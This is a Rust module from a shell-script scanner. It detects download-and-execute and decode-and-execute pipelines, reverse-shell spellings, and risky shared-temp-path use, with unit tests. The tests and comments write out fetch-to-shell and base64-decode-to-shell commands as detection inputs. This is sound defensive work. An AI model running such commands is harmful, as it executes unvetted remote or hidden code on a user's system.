//! Download/decode execution pairing for shell script text.
//!
//! Extracted from `detect.rs` (plan A4): the statement-scoped finding
//! families — fetch-to-interpreter and decoder-to-interpreter pipelines,
//! consumed substitution spans, reverse-shell spellings, and the shared
//! temporary-path rules — with per-line finding deduplication.
#[cfg(test)]
use super::budget::MAX_SHELL_ANALYSIS_NODES;
use super::budget::{CachedFindingSummary, ShellBudget};
use super::command::{
    redirect_moves_stdin_away, segment_commands, skip_command_prefixes, statement_outcomes,
};
use super::effects::{
    CommandEffects, ExecutionEffect, StdoutEffect, body_live_fetch_stdout, command_decodes,
    command_fetches, ir_command_decodes, ir_command_depends_on_inherited_stdin, ir_command_effects,
    ir_node_reaches_interpreter, ir_node_stdout_preserved, pipeline_has_live_producer,
    segment_has_live_producer, segment_stdin_reaches_interpreter, stdout_reaches,
};
use super::egress::{node_has_live_fetch_stdout, node_has_live_fetch_stdout_with_effects};
use super::indicators::{
    chmod_relaxes_shared_temp, reverse_shell_spelling, segment_has_shared_temp_path,
};
use super::interpreter::{INTERPRETER_BASENAMES, static_command_body};
use super::ir::{CommandNode, ExecutedBody, LogicalUnit, ShellProgram};
use super::lexer::{ShellToken, SubstKind, tokenize};
use super::syntax::{
    GroupKind, Outcomes, conditional_statements, grouped_token_ranges, pipeline_segments,
};
use crate::detect::{
    ResultParts, SCRIPT_DECODE_EXECUTE_RULE, SCRIPT_REVERSE_SHELL_RULE,
    SHARED_TEMP_CONTROLLED_RULE, SHARED_TEMP_INDICATOR_RULE, parts,
};
use crate::fingerprint::Confidence;

/// The shell consumption families over one token stream, collected without
/// duplicate (rule, semantic tag) pairs: a group's interior re-detects what
/// the outer segment already bound through its opening `(`, and repeated
/// statements on the line add no information.
pub(in crate::detect) fn shell_consumption_findings(
    tokens: &[ShellToken],
    shell_unit: Option<&LogicalUnit>,
    number: u32,
    download_rule: &'static str,
    found: &mut Vec<ResultParts>,
    budget: &mut ShellBudget,
) {
    if !budget.spend(tokens.len()) {
        return;
    }
    // The typed path owns direct command, compound, and available child
    // reachability. The token walk below remains as a bounded compatibility
    // fallback only when an opaque or depth-capped child requires it.
    let typed_pairing = shell_unit.map(|unit| typed_unit_pairing(unit, budget));
    if typed_pairing.is_some_and(|pairing| pairing.0) {
        push_finding(
            found,
            parts(
                download_rule,
                number,
                "download-execute",
                Confidence::LexicalFallback,
            ),
        );
    }
    if typed_pairing.is_some_and(|pairing| pairing.1) {
        push_finding(
            found,
            parts(
                SCRIPT_DECODE_EXECUTE_RULE,
                number,
                "decode-execute",
                Confidence::LexicalFallback,
            ),
        );
    }
    if let Some(unit) = shell_unit {
        let child_findings =
            typed_child_consumption_findings(&unit.statements, number, download_rule, budget);
        for finding in child_findings {
            push_finding(found, finding);
        }
    }
    let use_legacy_pairing = shell_unit.is_none() || typed_pairing.is_some_and(|pairing| pairing.2);
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(tokens) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue; // no path reaches it; the outcome set is unchanged
        }

        // Runtime text of every substitution this statement's live heads
        // execute — `eval`'s command substitutions and an interpreter's
        // process substitutions — re-parsed with the same command-position
        // rules.
        let consumed = consumed_substitutions(statement);

        // Download-execute: a fetch-tool command feeding an interpreter
        // through the pipeline, or heading a consumed span.
        if (use_legacy_pairing && pipeline_fetches_to_interpreter(statement, budget))
            || consumed
                .iter()
                .any(|span| span_has_fetch_command(span, budget))
        {
            push_finding(
                found,
                parts(
                    download_rule,
                    number,
                    "download-execute",
                    Confidence::LexicalFallback,
                ),
            );
        }

        // Decode-execute: a decoder command feeding an interpreter through
        // the pipeline, or heading a consumed span.
        if (use_legacy_pairing && pipeline_decodes_to_interpreter(statement, budget))
            || consumed
                .iter()
                .any(|span| span_executes_decoder(span, budget))
        {
            push_finding(
                found,
                parts(
                    SCRIPT_DECODE_EXECUTE_RULE,
                    number,
                    "decode-execute",
                    Confidence::LexicalFallback,
                ),
            );
        }

        for segment in pipeline_segments(statement) {
            if segment.is_empty() {
                continue;
            }
            if reverse_shell_spelling(segment) {
                push_finding(
                    found,
                    parts(
                        SCRIPT_REVERSE_SHELL_RULE,
                        number,
                        "reverse-shell",
                        Confidence::LexicalFallback,
                    ),
                );
            }
            // Shared temporary storage: the wrapper and the /tmp or
            // /dev/shm path share one command's segment (indicator),
            // or the chmod's own mode release targets one
            // (controlled). A pathname alone never proves attacker
            // control, and the indicator id is never repurposed. The
            // path is read from each command's real arguments, so a
            // quoted operand (`chmod 777 "/tmp/x"`) still binds while a
            // redirect target (`sudo true > /tmp/sudo.log`) never does.
            let shared_temp_path = segment_has_shared_temp_path(segment);
            if shared_temp_path
                && segment_commands(segment)
                    .iter()
                    .any(|command| matches!(command.head, "sudo" | "pkexec" | "doas"))
            {
                push_finding(
                    found,
                    parts(
                        SHARED_TEMP_INDICATOR_RULE,
                        number,
                        "privileged-shared-temp",
                        Confidence::LexicalFallback,
                    ),
                );
            }
            if shared_temp_path && chmod_relaxes_shared_temp(segment) {
                push_finding(
                    found,
                    parts(
                        SHARED_TEMP_CONTROLLED_RULE,
                        number,
                        "shared-temp-mode-release",
                        Confidence::LexicalFallback,
                    ),
                );
            }
        }

        // Static bodies execute with the statement: an interpreter's `-c`
        // body or an `eval` argument is real shell text, so every family
        // applies inside it too (`eval 'curl URL | sh'` and
        // `sh -c 'curl URL | sh'` run the pipeline now). Runtime-derived
        // bodies are outside the static slice.
        for segment in pipeline_segments(statement) {
            for command in segment_commands(segment) {
                let Some(body) = static_command_body(&command) else {
                    continue;
                };
                for finding in
                    cached_body_consumption_findings(&body, number, download_rule, budget)
                {
                    push_finding(found, finding);
                }
            }
        }

        // A subshell or brace group executes its interior as its own
        // statement list, so the same families apply inside it instead of
        // the group's separators merely being hidden from this pass. An
        // arithmetic command evaluates its interior as an expression whose
        // words are never commands — but genuine command substitutions
        // nested in it DO execute (`(( $(curl URL | sh) + 1 ))`).
        for (kind, group) in grouped_token_ranges(statement) {
            match kind {
                GroupKind::List => {
                    if budget.enter() {
                        shell_consumption_findings(
                            group,
                            None,
                            number,
                            download_rule,
                            found,
                            budget,
                        );
                        budget.leave();
                    }
                }
                GroupKind::Arithmetic => {
                    if budget.enter() {
                        tokens_arithmetic_consumption(group, number, download_rule, found, budget);
                        budget.leave();
                    }
                }
            }
        }

        // A command or process substitution ALWAYS executes its interior —
        // only whether its resulting OUTPUT is further consumed depends on
        // the outer head (consumed_substitutions). The families therefore
        // also apply inside it directly: `payload=$(curl URL | sh)` runs
        // the pipeline now. Words inside groups are reached by the group
        // recursion above; only the statement's own depth is walked here.
        let mut depth = 0i32;
        for token in statement {
            match token {
                ShellToken::Operator(op) => match op.as_str() {
                    "(" | "{" | "((" => depth += 1,
                    ")" | "}" | "))" => depth = (depth - 1).max(0),
                    _ => {}
                },
                ShellToken::Word { substitutions, .. } if depth == 0 => {
                    for substitution in substitutions {
                        match substitution.kind {
                            SubstKind::Command | SubstKind::Process => {
                                if !budget.enter() {
                                    break;
                                }
                                shell_consumption_findings(
                                    &tokenize(&substitution.inner),
                                    None,
                                    number,
                                    download_rule,
                                    found,
                                    budget,
                                );
                                budget.leave();
                            }
                            SubstKind::Arithmetic => arithmetic_consumption_findings(
                                &substitution.inner,
                                number,
                                download_rule,
                                found,
                                budget,
                            ),
                        }
                    }
                }
                _ => {}
            }
        }

        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
}

/// Walk child programs already owned by the IR. This keeps static bodies and
/// command/process substitutions on the same typed path as their parent;
/// the raw body walk remains only as a fallback when the depth ceiling made
/// a child program unavailable.
fn typed_child_consumption_findings(
    statements: &[super::ir::Statement],
    number: u32,
    download_rule: &'static str,
    budget: &mut ShellBudget,
) -> Vec<ResultParts> {
    let mut found = Vec::new();
    for statement in statements.iter().filter(|statement| statement.reachable) {
        for pipeline in &statement.pipelines {
            for node in &pipeline.commands {
                typed_node_child_findings(node, number, download_rule, budget, &mut found);
            }
        }
    }
    found
}

fn typed_node_child_findings(
    node: &CommandNode,
    number: u32,
    download_rule: &'static str,
    budget: &mut ShellBudget,
    found: &mut Vec<ResultParts>,
) {
    match node {
        CommandNode::Simple(command) => {
            if let Some(body) = &command.body {
                append_child_program_findings(body, number, download_rule, budget, found);
            }
            for word in &command.args {
                for substitution in &word.substitutions {
                    if matches!(substitution.kind, SubstKind::Command | SubstKind::Process) {
                        let body = ExecutedBody {
                            source: substitution.source.clone(),
                            program: substitution.program.clone(),
                        };
                        append_child_program_findings(&body, number, download_rule, budget, found);
                    }
                }
            }
        }
        CommandNode::Subshell { body, .. } | CommandNode::BraceGroup { body, .. } => {
            found.extend(typed_child_consumption_findings(
                body,
                number,
                download_rule,
                budget,
            ));
        }
        CommandNode::Arithmetic { .. }
        | CommandNode::ControlFlow { .. }
        | CommandNode::Opaque { .. } => {}
    }
}

fn append_child_program_findings(
    body: &ExecutedBody,
    number: u32,
    download_rule: &'static str,
    budget: &mut ShellBudget,
    found: &mut Vec<ResultParts>,
) {
    let Some(program) = body.program.as_deref() else {
        found.extend(cached_body_consumption_findings(
            &body.source,
            number,
            download_rule,
            budget,
        ));
        return;
    };
    found.extend(cached_program_consumption_findings(
        &body.source,
        program,
        number,
        download_rule,
        budget,
    ));
}

fn cached_program_consumption_findings(
    source: &str,
    program: &ShellProgram,
    number: u32,
    download_rule: &'static str,
    budget: &mut ShellBudget,
) -> Vec<ResultParts> {
    if budget.exhausted() {
        return Vec::new();
    }
    if let Some(summary) = budget.cached_finding_summary(source) {
        return finding_parts(summary, number, download_rule);
    }
    if !budget.enter() {
        return Vec::new();
    }
    let mut found = Vec::new();
    for unit in program.units() {
        shell_consumption_findings(
            unit.tokens(),
            Some(unit),
            number,
            download_rule,
            &mut found,
            budget,
        );
    }
    budget.leave();
    if !budget.exhausted() {
        budget.cache_finding_summary(source, summarize_findings(&found));
    }
    found
}

/// Direct fetch-to-interpreter pairing over the typed shell IR, including
/// live output from a static child body. Depth-capped children stay on the
/// bounded token fallback.
#[cfg(test)]
fn typed_fetch_reaches_interpreter(unit: &LogicalUnit, budget: &mut ShellBudget) -> bool {
    typed_unit_pairing(unit, budget).0
}

#[cfg(test)]
fn typed_decoder_reaches_interpreter(unit: &LogicalUnit, budget: &mut ShellBudget) -> bool {
    typed_unit_pairing(unit, budget).1
}

/// The complete typed pairing result for one logical unit. The same node
/// summary drives both producer channels, while the fallback bit tells the
/// caller whether legacy token handling is needed for an opaque/depth-capped
/// child.
fn typed_unit_pairing(unit: &LogicalUnit, budget: &mut ShellBudget) -> (bool, bool, bool) {
    let mut download_execute = false;
    let mut decode_execute = false;
    let mut needs_legacy_fallback = false;
    for statement in unit
        .statements
        .iter()
        .filter(|statement| statement.reachable)
    {
        for pipeline in &statement.pipelines {
            let (download, decode, fallback) = typed_pipeline_pairing(pipeline, budget);
            download_execute |= download;
            decode_execute |= decode;
            needs_legacy_fallback |= fallback;
        }
    }
    (download_execute, decode_execute, needs_legacy_fallback)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct DecoderOutput {
    reaches_stdout: bool,
    depends_on_inherited_stdin: bool,
}

impl DecoderOutput {
    const NONE: Self = Self {
        reaches_stdout: false,
        depends_on_inherited_stdin: false,
    };
}

fn typed_pipeline_pairing(
    pipeline: &super::ir::Pipeline,
    budget: &mut ShellBudget,
) -> (bool, bool, bool) {
    let mut live_fetch = false;
    let mut live_decoder = false;
    let mut download_execute = false;
    let mut decode_execute = false;
    let mut needs_legacy_fallback = false;

    for node in &pipeline.commands {
        let summary = summarize_node_once(node, budget);
        needs_legacy_fallback |= summary.needs_legacy_fallback;
        if summary.executes_stdin {
            download_execute |= live_fetch;
            decode_execute |= live_decoder;
        }
        live_fetch = summary.produces_fetch || (live_fetch && summary.forwards_stdin);
        live_decoder = summary.produces_decoder || (live_decoder && summary.forwards_stdin);
    }
    (download_execute, decode_execute, needs_legacy_fallback)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct NodeSummary {
    executes_stdin: bool,
    forwards_stdin: bool,
    produces_fetch: bool,
    produces_decoder: bool,
    needs_legacy_fallback: bool,
}

fn summarize_node_once(node: &CommandNode, budget: &mut ShellBudget) -> NodeSummary {
    match node {
        CommandNode::Simple(command) => {
            let effects = ir_command_effects(command, budget);
            let needs_legacy_fallback = command
                .body
                .as_ref()
                .is_some_and(|body| body.program.is_none())
                || command.args.iter().any(|word| {
                    word.substitutions.iter().any(|substitution| {
                        matches!(
                            substitution.kind,
                            super::lexer::SubstKind::Command | super::lexer::SubstKind::Process
                        ) && substitution.program.is_none()
                    })
                });
            NodeSummary {
                executes_stdin: matches!(
                    effects.execution,
                    ExecutionEffect::ExecutesStdin | ExecutionEffect::ExecutesTaintedArgument
                ),
                forwards_stdin: effects.stdout == StdoutEffect::ForwardedInput,
                produces_fetch: node_has_live_fetch_stdout_with_effects(
                    node,
                    budget,
                    Some(effects),
                ),
                produces_decoder: typed_node_decoder_output(node, budget, Some(effects))
                    .reaches_stdout,
                needs_legacy_fallback,
            }
        }
        CommandNode::Subshell { .. } | CommandNode::BraceGroup { .. } => NodeSummary {
            executes_stdin: ir_node_reaches_interpreter(node, budget),
            forwards_stdin: ir_node_stdout_preserved(node, budget),
            produces_fetch: node_has_live_fetch_stdout(node, budget),
            produces_decoder: false,
            needs_legacy_fallback: false,
        },
        CommandNode::Arithmetic { .. } | CommandNode::ControlFlow { .. } => NodeSummary {
            executes_stdin: false,
            forwards_stdin: false,
            produces_fetch: false,
            produces_decoder: false,
            needs_legacy_fallback: true,
        },
        CommandNode::Opaque { .. } => NodeSummary {
            executes_stdin: false,
            forwards_stdin: false,
            produces_fetch: false,
            produces_decoder: false,
            needs_legacy_fallback: true,
        },
    }
}

fn typed_node_decoder_output(
    node: &CommandNode,
    budget: &mut ShellBudget,
    supplied_effects: Option<CommandEffects>,
) -> DecoderOutput {
    match node {
        CommandNode::Simple(command) => {
            let effects = supplied_effects.unwrap_or_else(|| ir_command_effects(command, budget));
            if ir_command_decodes(command) {
                let depends_on_inherited_stdin =
                    ir_command_depends_on_inherited_stdin(command, budget);
                return DecoderOutput {
                    reaches_stdout: effects.stdout != StdoutEffect::Redirected
                        && (!node_stdin_redirected(node) || !depends_on_inherited_stdin),
                    depends_on_inherited_stdin,
                };
            }
            let Some(body) = command.body.as_ref() else {
                return DecoderOutput::NONE;
            };
            let Some(program) = body.program.as_deref() else {
                return DecoderOutput::NONE;
            };
            let child = typed_program_decoder_output(program, budget);
            DecoderOutput {
                reaches_stdout: child.reaches_stdout
                    && effects.stdout != StdoutEffect::Redirected
                    && (!node_stdin_redirected(node) || !child.depends_on_inherited_stdin),
                depends_on_inherited_stdin: child.depends_on_inherited_stdin,
            }
        }
        CommandNode::Subshell { .. } | CommandNode::BraceGroup { .. } => DecoderOutput::NONE,
        CommandNode::Arithmetic { .. }
        | CommandNode::ControlFlow { .. }
        | CommandNode::Opaque { .. } => DecoderOutput::NONE,
    }
}

fn node_stdin_redirected(node: &CommandNode) -> bool {
    let redirects = match node {
        CommandNode::Simple(command) => &command.redirects,
        CommandNode::Subshell { redirects, .. }
        | CommandNode::BraceGroup { redirects, .. }
        | CommandNode::Arithmetic { redirects, .. }
        | CommandNode::ControlFlow { redirects, .. }
        | CommandNode::Opaque { redirects, .. } => redirects,
    };
    redirects.iter().any(|redirect| {
        redirect_moves_stdin_away(
            &redirect.operator,
            redirect
                .target
                .as_ref()
                .map_or("", |target| target.value.as_str()),
        )
    })
}

fn typed_program_decoder_output(program: &ShellProgram, budget: &mut ShellBudget) -> DecoderOutput {
    if !budget.spend(1) {
        return DecoderOutput::NONE;
    }
    for unit in program.units() {
        for statement in unit
            .statements
            .iter()
            .filter(|statement| statement.reachable)
        {
            for pipeline in &statement.pipelines {
                for producer in 0..pipeline.commands.len() {
                    let output =
                        typed_node_decoder_output(&pipeline.commands[producer], budget, None);
                    if output.reaches_stdout
                        && pipeline.commands[producer + 1..]
                            .iter()
                            .all(|node| ir_node_stdout_preserved(node, budget))
                    {
                        return output;
                    }
                }
            }
        }
    }
    DecoderOutput::NONE
}

/// Walk a static shell body once per analysis and cache its complete finding
/// tag set. Cached tags are re-anchored to the current line and download rule
/// so the cache never carries source-location or caller-specific data.
fn cached_body_consumption_findings(
    body: &str,
    number: u32,
    download_rule: &'static str,
    budget: &mut ShellBudget,
) -> Vec<ResultParts> {
    if budget.exhausted() {
        return Vec::new();
    }
    if let Some(summary) = budget.cached_finding_summary(body) {
        return finding_parts(summary, number, download_rule);
    }
    if !budget.enter() {
        return Vec::new();
    }
    let mut found = Vec::new();
    shell_consumption_findings(
        &tokenize(body),
        None,
        number,
        download_rule,
        &mut found,
        budget,
    );
    budget.leave();
    if !budget.exhausted() {
        budget.cache_finding_summary(body, summarize_findings(&found));
    }
    found
}

fn summarize_findings(found: &[ResultParts]) -> CachedFindingSummary {
    CachedFindingSummary {
        download_execute: found
            .iter()
            .any(|finding| finding.semantic_value == "download-execute"),
        decode_execute: found
            .iter()
            .any(|finding| finding.semantic_value == "decode-execute"),
        reverse_shell: found
            .iter()
            .any(|finding| finding.semantic_value == "reverse-shell"),
        shared_temp_indicator: found
            .iter()
            .any(|finding| finding.semantic_value == "privileged-shared-temp"),
        shared_temp_controlled: found
            .iter()
            .any(|finding| finding.semantic_value == "shared-temp-mode-release"),
    }
}

fn finding_parts(
    summary: CachedFindingSummary,
    number: u32,
    download_rule: &'static str,
) -> Vec<ResultParts> {
    let mut found = Vec::new();
    if summary.download_execute {
        found.push(parts(
            download_rule,
            number,
            "download-execute",
            Confidence::LexicalFallback,
        ));
    }
    if summary.decode_execute {
        found.push(parts(
            SCRIPT_DECODE_EXECUTE_RULE,
            number,
            "decode-execute",
            Confidence::LexicalFallback,
        ));
    }
    if summary.reverse_shell {
        found.push(parts(
            SCRIPT_REVERSE_SHELL_RULE,
            number,
            "reverse-shell",
            Confidence::LexicalFallback,
        ));
    }
    if summary.shared_temp_indicator {
        found.push(parts(
            SHARED_TEMP_INDICATOR_RULE,
            number,
            "privileged-shared-temp",
            Confidence::LexicalFallback,
        ));
    }
    if summary.shared_temp_controlled {
        found.push(parts(
            SHARED_TEMP_CONTROLLED_RULE,
            number,
            "shared-temp-mode-release",
            Confidence::LexicalFallback,
        ));
    }
    found
}

/// Consumption families inside an arithmetic expansion: the expression's
/// own words (and grouping parens) are never commands, but a genuine
/// command substitution nested in it executes during evaluation
/// (`x=$(( 1 + $(curl URL | sh | wc -c) ))`).
fn arithmetic_consumption_findings(
    expression: &str,
    number: u32,
    download_rule: &'static str,
    found: &mut Vec<ResultParts>,
    budget: &mut ShellBudget,
) {
    if !budget.spend(expression.len()) || !budget.enter() {
        return;
    }
    tokens_arithmetic_consumption(&tokenize(expression), number, download_rule, found, budget);
    budget.leave();
}

/// Consumption families for the words of an arithmetic context — an
/// expansion's interior OR an arithmetic command group's interior: the
/// words are expression operands, but a genuine command or process
/// substitution nested in them executes during evaluation. Each recursive
/// helper owns its single depth charge: command/process substitution
/// interiors enter here, nested arithmetic enters in
/// `arithmetic_consumption_findings`.
fn tokens_arithmetic_consumption(
    tokens: &[ShellToken],
    number: u32,
    download_rule: &'static str,
    found: &mut Vec<ResultParts>,
    budget: &mut ShellBudget,
) {
    for token in tokens {
        if let ShellToken::Word { substitutions, .. } = token {
            for substitution in substitutions {
                match substitution.kind {
                    SubstKind::Command | SubstKind::Process => {
                        if budget.enter() {
                            shell_consumption_findings(
                                &tokenize(&substitution.inner),
                                None,
                                number,
                                download_rule,
                                found,
                                budget,
                            );
                            budget.leave();
                        }
                    }
                    SubstKind::Arithmetic => arithmetic_consumption_findings(
                        &substitution.inner,
                        number,
                        download_rule,
                        found,
                        budget,
                    ),
                }
            }
        }
    }
}

/// Push one finding unless the same rule already fired with the same
/// semantic tag on this line.
fn push_finding(found: &mut Vec<ResultParts>, finding: ResultParts) {
    if !found.iter().any(|existing| {
        existing.rule_id == finding.rule_id && existing.semantic_value == finding.semantic_value
    }) {
        found.push(finding);
    }
}

/// A fetch-tool command whose output reaches an interpreter down the same
/// pipeline: `curl … | sh`, `curl x | gzip -d | sh`, including from inside a
/// producing compound group (`(echo x; curl URL) | sh`). The fetch site's
/// own stdout must land on the pipe and the body must survive every
/// intermediate segment.
fn pipeline_fetches_to_interpreter(statement: &[ShellToken], budget: &mut ShellBudget) -> bool {
    let segments = pipeline_segments(statement);
    for consumer in 1..segments.len() {
        if !segment_stdin_reaches_interpreter(segments[consumer], budget) {
            continue;
        }
        for producer in 0..consumer {
            if segment_has_live_producer(segments[producer], budget, &command_fetches)
                && stdout_reaches(&segments, producer, consumer, budget)
            {
                return true;
            }
        }
    }
    false
}

/// A decoder command feeding an interpreter through the pipe: `… | base64 -d
/// | sh`, `curl x | xxd -r | zsh`, including across intermediate segments,
/// with the decoder's own stdout tracked per command site.
fn pipeline_decodes_to_interpreter(statement: &[ShellToken], budget: &mut ShellBudget) -> bool {
    let segments = pipeline_segments(statement);
    for consumer in 1..segments.len() {
        if !segment_stdin_reaches_interpreter(segments[consumer], budget) {
            continue;
        }
        for producer in 0..consumer {
            if segment_has_live_producer(segments[producer], budget, &command_decodes)
                && stdout_reaches(&segments, producer, consumer, budget)
            {
                return true;
            }
        }
    }
    false
}

/// Runtime interiors of the substitutions this statement's live heads
/// execute: an `eval` in command position runs its command substitutions'
/// text, and an interpreter/`source`/`.` head runs its process substitutions
/// as script input. `diff <(curl a)` compares and `echo eval "$(curl …)"`
/// never executes, so neither yields a consumed span.
fn consumed_substitutions(statement: &[ShellToken]) -> Vec<String> {
    let mut spans = Vec::new();
    for segment in pipeline_segments(statement) {
        let commands = segment_commands(segment);
        let head_eval = commands.iter().any(|command| command.head == "eval");
        let head_consumes = commands.iter().any(|command| {
            INTERPRETER_BASENAMES.contains(&command.head) || command.head == "source"
        }) || segment_head_word(segment) == Some(".");
        for token in segment {
            if let ShellToken::Word { substitutions, .. } = token {
                for substitution in substitutions {
                    let executed = match substitution.kind {
                        SubstKind::Command => head_eval,
                        SubstKind::Process => head_consumes,
                        // Arithmetic evaluates to a number; `eval 0` runs no
                        // fetched text.
                        SubstKind::Arithmetic => false,
                    };
                    if executed {
                        spans.push(substitution.inner.clone());
                    }
                }
            }
        }
    }
    spans
}

/// The head word value of a segment before basename reduction, so a bare `.`
/// source is recognisable (`command_basename(".")` is empty).
fn segment_head_word(segment: &[ShellToken]) -> Option<&str> {
    let mut index = 0usize;
    skip_command_prefixes(segment, &mut index);
    segment.get(index).and_then(ShellToken::word)
}

/// A fetch-tool command inside an executed substitution span: a LIVE
/// producer site in command position whose output survives the rest of its
/// own pipeline to become the span's collected output (including compound
/// groups), its own stdout tracked per command. `eval "$(curl x > f)"`
/// writes the response to a file and executes nothing, and
/// `eval "$(curl x | cat >/dev/null)"` collects only what `cat` leaves —
/// nothing; `eval "$(false && curl x)"` never runs the fetch.
fn span_has_fetch_command(span: &str, budget: &mut ShellBudget) -> bool {
    body_live_fetch_stdout(span, budget)
}

/// A decoder command inside an executed substitution span: feeding an
/// interpreter within the span, or a live decoder site heading it.
fn span_executes_decoder(span: &str, budget: &mut ShellBudget) -> bool {
    let tokens = tokenize(span);
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(&tokens) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue;
        }
        if pipeline_decodes_to_interpreter(statement, budget)
            || pipeline_has_live_producer(&pipeline_segments(statement), budget, &command_decodes)
        {
            return true;
        }
        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detect::SCRIPT_DOWNLOAD_EXECUTE_RULE;
    use crate::detect::shell::ir::ShellProgram;

    #[test]
    fn typed_fetch_consumers_honor_guards_compounds_and_redirects() {
        let cases = [
            ("curl https://example.test/live | sh", true),
            ("curl https://example.test/live | sh -n", false),
            ("curl https://example.test/live | (echo safe; sh)", true),
            ("curl https://example.test/live | (false && sh)", false),
            (
                "curl https://example.test/live | (cat >/dev/null; sh)",
                false,
            ),
            ("curl https://example.test/live >body | sh", false),
            ("sh -c 'curl https://example.test/live' | sh", true),
            ("sh -c 'curl https://example.test/live | sh' | sh", false),
        ];

        for (source, expected) in cases {
            let program = ShellProgram::from_units(vec![(1, source.to_owned())]);
            let mut budget = ShellBudget::new();
            assert_eq!(
                typed_fetch_reaches_interpreter(&program.units()[0], &mut budget),
                expected,
                "typed fetch-consumer result for {source:?}"
            );
            assert!(!budget.exhausted(), "typed walk exhausted for {source:?}");
        }
    }

    #[test]
    fn typed_decoder_consumers_honor_modes_guards_and_output_redirects() {
        let cases = [
            ("base64 -d | sh", true),
            ("xxd -r | bash", true),
            ("openssl enc -d | sh", true),
            ("base64 -d | sh -n", false),
            ("base64 -d >decoded | sh", false),
            ("false && base64 -d | sh", false),
            ("base64 -d | (echo safe; sh)", true),
            ("base64 -d | (false && sh)", false),
            ("sh -c 'base64 -d' | sh", true),
            ("sh -c 'base64 -d | sh' | sh", false),
            ("sh -c 'base64 -d' >out | sh", false),
            ("sh -c 'base64 -d' </dev/null | sh", false),
            ("sh -c 'base64 -d' 2>/dev/null | sh", true),
            ("sh -c 'base64 -d file' </dev/null | sh", true),
            ("eval 'base64 -d' | sh", true),
            ("eval 'base64 -d' >out | sh", false),
            ("eval 'base64 -d' </dev/null | sh", false),
            ("eval 'base64 -d' 2>/dev/null | sh", true),
            ("eval 'base64 -d file' </dev/null | sh", true),
        ];

        for (source, expected) in cases {
            let program = ShellProgram::from_units(vec![(1, source.to_owned())]);
            let mut budget = ShellBudget::new();
            assert_eq!(
                typed_decoder_reaches_interpreter(&program.units()[0], &mut budget),
                expected,
                "typed decoder-consumer result for {source:?}"
            );
            assert!(!budget.exhausted(), "typed walk exhausted for {source:?}");
        }
    }

    #[test]
    fn static_body_finding_summaries_reuse_positive_and_negative_results() {
        let mut budget = ShellBudget::new();
        let first = cached_body_consumption_findings(
            "curl https://example.test/x | sh; base64 -d | sh",
            7,
            SCRIPT_DOWNLOAD_EXECUTE_RULE,
            &mut budget,
        );
        let nodes_after_first = budget.nodes;
        assert_eq!(first.len(), 2);
        assert!(first.iter().any(|finding| {
            finding.semantic_value == "download-execute" && finding.line == Some(7)
        }));
        assert!(
            first
                .iter()
                .any(|finding| finding.semantic_value == "decode-execute")
        );

        let second = cached_body_consumption_findings(
            "curl https://example.test/x | sh; base64 -d | sh",
            99,
            SCRIPT_DOWNLOAD_EXECUTE_RULE,
            &mut budget,
        );
        assert_eq!(budget.nodes, nodes_after_first);
        assert_eq!(second.len(), first.len());
        assert!(second.iter().all(|finding| finding.line == Some(99)));

        let safe_first = cached_body_consumption_findings(
            "echo safe",
            1,
            SCRIPT_DOWNLOAD_EXECUTE_RULE,
            &mut budget,
        );
        let nodes_after_safe = budget.nodes;
        let safe_second = cached_body_consumption_findings(
            "echo safe",
            2,
            SCRIPT_DOWNLOAD_EXECUTE_RULE,
            &mut budget,
        );
        assert!(safe_first.is_empty());
        assert!(safe_second.is_empty());
        assert_eq!(budget.nodes, nodes_after_safe);
        assert!(!budget.exhausted());

        assert!(!budget.spend(usize::MAX));
        assert!(
            cached_body_consumption_findings(
                "curl https://example.test/x | sh; base64 -d | sh",
                3,
                SCRIPT_DOWNLOAD_EXECUTE_RULE,
                &mut budget,
            )
            .is_empty()
        );
    }

    #[test]
    fn typed_pipeline_work_is_linear_and_keeps_later_compounds_live() {
        let benign = std::iter::repeat_n("cat", 1_001)
            .collect::<Vec<_>>()
            .join(" | ");
        let source = format!("{benign}; (curl https://example.test/live | sh)");
        let program = ShellProgram::from_units(vec![(1, source)]);
        let unit = &program.units()[0];
        let mut budget = ShellBudget::new();
        let mut found = Vec::new();
        shell_consumption_findings(
            unit.tokens(),
            Some(unit),
            1,
            SCRIPT_DOWNLOAD_EXECUTE_RULE,
            &mut found,
            &mut budget,
        );

        assert!(!budget.exhausted());
        assert!(
            found
                .iter()
                .any(|finding| finding.semantic_value == "download-execute")
        );
        let consumed = MAX_SHELL_ANALYSIS_NODES - budget.nodes;
        assert!(
            consumed <= unit.tokens().len() as u32 * 8,
            "typed work should stay within a small linear bound: {} nodes for {} tokens",
            consumed,
            unit.tokens().len()
        );
    }
}
